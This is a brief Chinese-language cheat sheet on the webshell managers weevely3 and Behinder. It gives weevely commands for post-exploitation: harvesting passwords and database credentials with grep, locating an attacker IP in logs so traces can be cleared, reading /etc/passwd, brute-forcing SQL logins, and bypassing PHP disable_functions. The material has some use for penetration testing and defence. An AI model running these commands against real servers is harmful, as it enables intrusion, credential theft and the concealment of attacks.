### Webshell管理与后渗透工具

|名称|属性|针对目标环境|描述|
|:-------------:|--|--|-----|
|[epinna/weevely3](https://github.com/epinna/weevely3)|python|php|文件管理/HTTP(S) proxy/Bruteforce SQL accounts/Port scan|
|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|php/Java/.NET|“冰蝎” 动态二进制加密 webshell管理端|

#### 后渗透功能

weevely的后渗透功能：
* 信息搜集
    * 使用grep提取各文件中的敏感信息
      * 口令
        * `grep . '^[^*/#]*passw?o?r?d?'`
      * 连接数据库的代码
        * `grep . 'mysql_conn'`
      * 日志 搜索敏感ip以便后续清除攻击痕迹
        * `grep . '209.12.12.12'`
    * SQL交互模式
      * 使用sql_console模块 - 连接mysql 并进入交互模式
        * `sql_console -user USER -passwd PASS123 -host 10.2.3.4` 然后可以使用`show databases;`等进行命令交互。
    * 读取敏感文件
      * 使用audit_etcpasswd模块 - 用不同技术读取passwd文件
        * `:audit_etcpasswd`
    * 暴力枚举登录口令
      * 使用bruteforce_sql模块 - 暴力枚举SQL用户的登录口令
        * `:bruteforce_sql mysql -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`
    * 命令交互
      * 使用audit_disablefunctionbypass模块 - 伪终端命令交互
        * 启动模块`:audit_disablefunctionbypass` 注意：会上传 .htaccess 和 CGI脚本 acubu.ved
        * 可执行系统命令 `ps -aux` `whoami` 等
        * 使用后删除刚才上传的文件 `:file_rm .htaccess` `:file_rm acubu.ved`
        * 如果不清理以上文件则下次可以免上传直接启动终端 `:audit_disablefunctionbypass -just-run http://localhost/acubu.ved`
